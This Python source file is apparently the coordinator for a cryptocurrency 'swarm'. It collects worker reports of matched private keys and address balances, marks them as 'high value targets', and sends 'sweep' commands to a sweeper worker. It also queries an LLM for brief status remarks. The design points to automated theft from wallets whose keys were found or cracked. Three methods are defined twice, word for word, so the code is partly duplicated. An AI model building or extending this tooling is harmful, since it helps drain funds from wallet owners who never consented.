#!/usr/bin/env python3
"""SWARM ORCHESTRATOR v1.1 - Fixed"""

import asyncio
import json
import os
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Any

RESULTS_QUEUE = asyncio.Queue()
COMMAND_QUEUES: Dict[str, asyncio.Queue] = {}

@dataclass
class WorkerStatus:
    name: str
    active: bool = False
    last_update: str = ""
    findings: List[Dict] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

@dataclass 
class SwarmState:
    workers: Dict[str, WorkerStatus] = field(default_factory=dict)
    high_value_targets: List[Dict] = field(default_factory=list)
    pending_sweeps: List[Dict] = field(default_factory=list)
    trade_opportunities: List[Dict] = field(default_factory=list)
    total_value_found: float = 0.0

class ReasoningAgent:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.state = SwarmState()
        self.running = False

    async def think(self, context: str) -> str:
        if not self.api_key:
            return "NO_KEY"
        try:
            import httpx
            async with httpx.AsyncClient() as client:
                resp = await client.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers={"Authorization": f"Bearer {self.api_key}"},
                    json={
                        "model": "llama-3.1-8b-instant",
                        "messages": [
                            {"role": "system", "content": "Crypto swarm orchestrator. Be concise."},
                            {"role": "user", "content": context}
                        ],
                        "max_tokens": 100
                    },
                    timeout=30
                )
                data = resp.json()
                if "choices" in data:
                    return data["choices"][0]["message"]["content"]
                return f"ERR:{str(data)[:80]}"
        except Exception as e:
            return f"ERR:{e}"
    
    async def process_result(self, result: Dict):
        worker = result.get("worker", "unknown")
        rtype = result.get("type", "info")
        data = result.get("data", {})
        
        if worker not in self.state.workers:
            self.state.workers[worker] = WorkerStatus(name=worker)
        
        self.state.workers[worker].last_update = datetime.now().isoformat()
        self.state.workers[worker].active = True
        
        if rtype == "key_match":
            self.state.high_value_targets.append(data)
            print(f"🔑 KEY MATCH: {data.get('address')} - {data.get('balance')}")
            if "sweeper" in COMMAND_QUEUES:
                await COMMAND_QUEUES["sweeper"].put({"action": "sweep", "target": data})
        elif rtype == "balance_found":
            self.state.pending_sweeps.append(data)
            self.state.total_value_found += float(data.get("value_usd", 0))
            print(f"💰 BALANCE: {data.get('address')[:10]}... ${data.get('value_usd', 0):.2f}")
        elif rtype == "trade_signal":
            self.state.trade_opportunities.append(data)
            print(f"📈 SIGNAL: {data.get('token')} - {data.get('action')}")

    async def orchestrate(self):
        self.running = True
        cycle = 0
        print("🧠 ORCHESTRATOR ONLINE")
        
        while self.running:
            cycle += 1
            while not RESULTS_QUEUE.empty():
                result = await RESULTS_QUEUE.get()
                await self.process_result(result)
            
            if cycle % 10 == 0 and self.api_key:
                ctx = f"Cycle:{cycle} Value:${self.state.total_value_found:.2f} Matches:{len(self.state.high_value_targets)}"
                thought = await self.think(ctx)
                print(f"🧠 {thought[:100]}")
            
            if cycle % 30 == 0:
                self.print_status()
            await asyncio.sleep(1)
    
    def print_status(self):
        print("\n" + "=" * 50)
        print(f"📊 STATUS - {datetime.now().strftime('%H:%M:%S')}")
        for name, s in self.state.workers.items():
            print(f"{'🟢' if s.active else '🔴'} {name}: {len(s.findings)} finds")
        print(f"💰 Total: ${self.state.total_value_found:.2f}")
        print("=" * 50)

    def stop(self):
        self.running = False

    async def orchestrate(self):
        self.running = True
        cycle = 0
        print("🧠 ORCHESTRATOR ONLINE")
        
        while self.running:
            cycle += 1
            while not RESULTS_QUEUE.empty():
                result = await RESULTS_QUEUE.get()
                await self.process_result(result)
            
            if cycle % 10 == 0 and self.api_key:
                ctx = f"Cycle:{cycle} Value:${self.state.total_value_found:.2f} Matches:{len(self.state.high_value_targets)}"
                thought = await self.think(ctx)
                print(f"🧠 {thought[:100]}")
            
            if cycle % 30 == 0:
                self.print_status()
            await asyncio.sleep(1)
    
    def print_status(self):
        print("\n" + "=" * 50)
        print(f"📊 STATUS - {datetime.now().strftime('%H:%M:%S')}")
        for name, s in self.state.workers.items():
            print(f"{'🟢' if s.active else '🔴'} {name}: {len(s.findings)} finds")
        print(f"💰 Total: ${self.state.total_value_found:.2f}")
        print("=" * 50)

    def stop(self):
        self.running = False
